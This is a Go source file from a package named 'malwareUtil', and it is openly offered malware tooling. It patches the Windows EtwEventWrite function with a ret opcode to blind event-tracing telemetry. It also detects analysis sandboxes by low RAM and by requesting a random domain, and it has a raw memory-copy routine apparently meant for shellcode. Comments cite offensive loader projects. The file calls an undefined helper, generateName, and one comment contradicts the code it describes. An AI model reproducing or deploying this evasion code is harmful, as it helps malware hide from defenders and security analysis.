package malwareUtil

import (
	"golang.org/x/sys/windows"
	"net/http"
	"syscall"
	"unsafe"
)

var (
	fntdll             = syscall.NewLazyDLL("ntdll.dll")
	fucketw            = fntdll.NewProc("EtwEventWrite")
	k32                = syscall.NewLazyDLL("kernel32.dll")
	WriteProcessMemory = k32.NewProc("WriteProcessMemory")
)

// EtwPatch patches the EtwEventWrite function
// https://github.com/timwhitez/Doge-Assembly/blob/main/loader/etw.go
// write arbitrary ret opcodes into the ETW event writing function (EtwEventWrite) to bypass ETW
func EtwPatch(hProcess uintptr) {
	var oldProtect uint32
	var patch = []byte{0xc3}

	windows.VirtualProtect(fucketw.Addr(), 1, windows.PAGE_EXECUTE_READWRITE, &oldProtect)
	WriteProcessMemory.Call(hProcess, fucketw.Addr(), uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
	windows.VirtualProtect(fucketw.Addr(), 1, oldProtect, &oldProtect)
}

// VmCheck checks if the process is running in a VM and returns true
func VmCheck() bool {
	if checkRam() {
		return true
	}
	if checkUrl() {
		return true
	}
	return false
}

// Memcpy is a replacement for the C memcpy function
// https://github.dev/timwhitez/Doge-Gabh/blob/main/example/shellcodecalc/calc.go
func Memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

// checkRam checks if the system has less than 1GB of ram
func checkRam() bool {
	var mem uint64
	k32.NewProc("GetPhysicallyInstalledSystemMemory").Call(uintptr(unsafe.Pointer(&mem)))
	// if ram is less than 1GB, return false
	return mem < 1000000
}

// checkUrl checks if a random url exist
func checkUrl() bool {
	n := generateName(8)
	url := "http://" + n + ".com"
	_, err := http.Get(url)
	if err == nil {
		// if the url exists, return true
		return true
	}
	return false
}
